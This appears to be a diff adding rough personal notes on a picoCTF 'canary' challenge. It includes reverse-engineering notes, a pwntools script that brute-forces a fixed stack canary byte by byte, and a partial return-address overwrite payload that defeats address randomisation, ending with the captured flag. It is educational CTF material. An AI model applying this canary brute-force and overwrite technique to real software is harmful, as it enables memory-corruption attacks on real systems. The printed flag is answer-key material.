@@ -1,0 +1,98 @@
+display_flag:
+I guess this will display the flag.
+offset is 0x7ed
+
+read_canary:
+
+opened file "/problems/canary_1_a5eaebeeb66458dec31e09fa8fc517fd/canary.txt", and check the fd is not 0 after the call to fopen.
+stored in a global variable called key, the value from the canary file. it uses fread() for this.
+fread(&key, 1, 4, canary_file);
+closes the file canary_file.
+
+
+vuln:
+
+
+buffer
+^
+|-0x20
+v
+canary
+^
+|-0x10
+V
+ebp-> 	ebp
+		eip
+
+
+
+
+puts at ebp-0x10 the value stored in the key global variable.
+then loops for 0x1f times, which in those loops it reads one char from stdin. and stops loop if finds \n or 0xa in byte value.
+
+
+char *entry_length_string;
+char *user_entry_input;
+int entry_length;
+
+fgets(entry_length_string, 0x1f, stdin);
+sscanf(entry_lenght_string, "%d", entry_length);
+read(stdin/0, user_entry_input, entry_length);
+
+[*] I created a script to brute force the values from the canary one by one. 
+
+first_byte = 55 == '7'
+55 == '7'
+97 == 'a'
+54 == '6'
+72 == 'H'
+0 == '\x00'
+
+This was a snippet from the script i used.
+[12]: for i in range(0x100):
+    ...:     p = process('./vuln')
+    ...:     p.read()
+    ...:     p.send('37\n')
+    ...:     p.read()
+    ...:     p.send('a'*32 + '7a6H' + p8(i))
+    ...:     if 'Stack Smashing' not in p.read():
+    ...:         print('no stack smashing {}'.format(i))
+    ...:         break
+    ...:     p.close()
+
+payload = 'a' * 32 + '7a6H' + 'a' * (0x10 + 4)
+flag_string = '\xed\x07'
+
+
+
+
+[*] I noticed that the program base address where it is (the program) being loaded gets randomized.
+So i decided i only overwrite two bytes from the return address, and keep the high two bytes that might already be set validly, because that offset of the base address wouldn't be so large.
+
+payload = 'a'*32 + '7a6H' + 'aaaabbbbccccdddd\xed\x07'
+
+[*] I decided to brute force the program, and run it several time until my ovwrriten values of the return address will be valid, and then i would check if the flag was in the output.
+
+In [4]: payload = 'a'*32 + '7a6H' + 'aaaabbbbccccdddd\xed\x07'
+
+In [5]: while True:
+   ...:     p = process('./vuln')
+   ...:     p.read()
+   ...:     p.send('54\n')
+   ...:     p.read()
+   ...:     p.send(payload)
+   ...:     result = p.read()
+   ...:     
+   ...:     if 'pico' in result:
+   ...:         print(result)
+   ...:         break
+   ...:     p.close()
+   ...:     
+
+
+[x] Starting local process './vuln'
+[+] Starting local process './vuln': pid 178215
+Ok... Now Where's the Flag?
+picoCTF{cAnAr135_mU5t_b3_r4nd0m!_0e5152a1}
+
+It Worked !!!!
